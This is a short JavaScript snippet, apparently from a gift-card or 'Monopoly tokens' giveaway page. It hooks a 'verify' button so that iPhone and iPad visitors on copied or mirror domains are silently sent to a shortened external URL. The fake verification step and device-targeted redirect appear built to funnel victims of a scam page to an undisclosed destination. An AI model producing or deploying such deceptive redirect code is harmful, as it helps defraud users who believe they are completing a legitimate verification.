/*================== [ VICTOR ABDO ] ===============*/
/*================== [ talghi gift card iph ] ================*/
var button = document.querySelector('.verify');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://smrturl.co/8a45e5f";
        var blockedDomains = [
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
